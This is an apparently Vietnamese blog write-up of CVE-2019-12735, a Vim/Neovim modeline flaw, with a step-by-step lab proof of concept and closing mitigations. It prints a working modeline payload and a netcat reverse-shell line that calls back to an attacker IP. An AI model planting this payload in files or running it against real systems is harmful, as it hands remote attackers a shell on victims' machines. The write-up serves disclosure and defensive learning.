![](https://images.viblo.asia/457c936f-82a6-401a-a8ef-e693f2c15da6.jpg)

- Nếu gần đây bạn chưa cập nhật hệ điều hành Linux, đặc biệt là tiện ích soạn thảo văn bản dòng lệnh, đừng thử xem nội dung của tệp bằng Vim hoặc Neovim.
- **Nhà nghiên cứu bảo mật [Armin Razmjou](https://twitter.com/rawsec) gần đây đã phát hiện ra lỗ hổng thực thi lệnh hệ điều hành tùy ý nghiêm trọng cao (CVE-2019-12735) ở Vim và Neovim – hai ứng dụng chỉnh sửa văn bản dòng lệnh phổ biến và mạnh mẽ nhất được cài đặt sẵn với hầu hết các hệ điều hành dựa trên Linux.**

- Trên các hệ thống Linux, trình soạn thảo Vim cho phép người dùng tạo, xem hoặc chỉnh sửa bất kỳ tệp nào, bao gồm văn bản, tập lệnh lập trình và tài liệu. Do Neovim chỉ là một phiên bản mở rộng của Vim, với trải nghiệm người dùng, plugin và GUI tốt hơn, lỗ hổng thực thi mã cũng nằm trong đó.
# Lỗ hổng thực thi mã trong Vim và Neovim

- [Razmjou](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md) đã phát hiện ra một lỗ hổng trong cách trình soạn thảo Vim xử lý “modelines”, một tính năng được bật theo mặc định để tự động tìm và áp dụng một tập hợp các tùy chọn tùy chỉnh được đề cập bởi người tạo tệp gần dòng bắt đầu và kết thúc trong tài liệu.

![](https://images.viblo.asia/ece5d294-c36a-47ea-9175-62f272df9cde.gif)

- Mặc dù trình chỉnh sửa chỉ cho phép một tập hợp con các tùy chọn trong mô hình (vì lý do bảo mật) và sử dụng sandbox protection nếu nó chứa biểu thức không an toàn, Razmjou tiết lộ rằng sử dụng lệnh “:source!”  (với một sửa đổi [!]) có thể được sử dụng để bỏ qua sandbox.
- Do đó, chỉ cần mở một tệp được tạo thủ công đặc biệt bằng cách sử dụng Vim hoặc Neovim có thể cho phép kẻ tấn công bí mật thực thi các lệnh trên hệ thống Linux của bạn và kiểm soát nó từ xa.
- Nhà nghiên cứu cũng đã phát hành public hai Proof-of-Concept (PoC) cho mọi người, một trong số đó thể hiện một kịch bản tấn công ngoài đời thực, trong đó một kẻ tấn công từ xa có quyền truy cập vào một reverse shell từ hệ thống của nạn nhân ngay khi anh ta mở một tập tin trên nó.



# Dưới đây là từng bước khai thác lỗ hổng PoC:
- **Máy PoC** : Ở đây ta đã sử dụng Kali Linux của tôi (4.17.8 x86_64) làm máy mục tiêu cho thử nghiệm này. 
    + IP máy Victim : 172.31.242.25 
    + IP máy Attacking : 172.31.242.143 

- **Mô Tả quá trình** : 
    + Kiểm tra nếu tùy chọn modeline chưa bị tắt.
    + Để PoC thực thi lệnh trên trình soạn thảo Vim. 
    + Chạy shell để tạo lệnh reverse shell kết nối ngược lại máy Attacking và sau đó chiếm quyền hệ thống.

    ##### Bước 1: Chi tiết kernel Kali linux:
    ```
        root@kali:~# cat /proc/version
        Linux version 4.17.0-kali1-amd64 (devel@kali.org) (gcc version 7.3.0 (Debian 7.3.0–25)) 
        #1 SMP Debian 4.17.8–1kali1 (2018–07–24)
        root@kali:~#
    ```
    
    ![](https://images.viblo.asia/80c80213-49ef-477f-a89d-8a88340c6503.png)
    
    ##### Bước 2: Đặt modeline trong tệp vimrc. Chỉ cần thêm `':set modeline'` vào cuối tệp và lưu lại
    
    ```
        root@kali:~# tail -2 /etc/vim/vimrc
        
        :set modeline
        root@kali:~#
    ```
    
    ![](https://images.viblo.asia/a5488c42-4df1-4894-9b37-f5961e691f8c.png)
    
   ##### Bước 3: Tạo file `cmdtest.txt` để thực thi lệnh.
   ```
        root@kali:~# cat cmdtest.txt
        
        :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
        root@kali:~#
   ```
   ![](https://images.viblo.asia/38cb81f6-bacd-4ed1-b167-7973b9fe22b1.png)
   
  #####  Bước 4: Bây giờ mở tệp trên bằng trình chỉnh sửa vim. Nó sẽ đưa ra output tương ứng với kết quả của commad `'uname -a'` .
  ```
        root@kali:~# vim cmdtest.txt
        Linux kali 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8–1kali1 (2018–07–24) x86_64 GNU/Linux
        Press ENTER or type command to continue
  ```
  ![](https://images.viblo.asia/2eb3dab1-66c0-4430-9a6f-54d8188251aa.png)
  - Nhấn nút Enter, điều này sẽ đưa bạn đến trình soạn thảo Vim. Sử dụng `': q!'` để thoát khỏi nó.
     
  ##### Bước 5: Bây giờ đến phần thú vị thực sự : Tạo reverse shell.
  - Tạo một tệp mới hoặc chỉnh sửa `cmdtest.txt` để ghi đè lệnh reverse shell thay vì sử dụng lệnh `uname` đơn giản.
  
   ##### Bước 5.1: Ở phía Attacker:
   - Thiết lập trình nghe netcat trên máy attacking 
   ![](https://images.viblo.asia/1e389d9a-38c4-4511-a4cd-1373c7578c1c.png)
   
  ##### Bước 5.2: Ở phía Victim: Chuẩn bị và thực hiện exploit
  - Tôi đang tạo một tệp mới có tên `'revshell.txt'` trong đó tôi đã thay thế lệnh `'uname -a'` trước đó bằng lệnh netcat reverse shell  đơn giản.
  ```
      root@kali:~# cat revshell.txt
      :!nc -nv 172.31.242.143 4444 -e /bin/sh ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
      root@kali:~#
  ```
  
  ![](https://images.viblo.asia/a6173d71-9c09-454d-ba4a-8ea21e924547.png)
  
  ##### Bước 5.3: Cuối cùng mở tệp `revshell.txt` bằng lệnh Vim và xem reverse shell tìm đến máy Attacking .
     - **Bên Phía Victim**: 
     
     ```
         root@kali:~# vim revshell.txt
        (UNKNOWN) [172.31.242.143] 4444 (?) open
     ```
     ![](https://images.viblo.asia/29c3b31d-2da9-41db-b5b1-dedfcabed01c.png)
     
     - **Bên Phía Attacker**: 
    
     ![](https://images.viblo.asia/1e389d9a-38c4-4511-a4cd-1373c7578c1c.png)
    
    - Và sau đó Attacker có thể dễ dàng chiếm quyền.

# Kết Luận :
- Các nhà bảo trì của Vim (bản vá 8.1.1365) và Neovim (phát hành trong v0.3.6) đã phát hành bản cập nhật cho cả hai tiện ích để giải quyết vấn đề, người dùng nên cài đặt càng sớm càng tốt.
- Bên cạnh đó, nhà nghiên cứu cũng đã khuyến nghị người dùng:
    + vô hiệu hóa tính năng modelines
    + vô hiệu hóa “modelineexpr” để không cho phép các expressions trong modelines
    + sử dụng “securemodelines plugin”, một giải pháp thay thế an toàn cho các Vim modeline.
     -----
**Nguồn**: 
- https://thehackernews.com/2019/06/linux-vim-vulnerability.html#email-outer
- https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf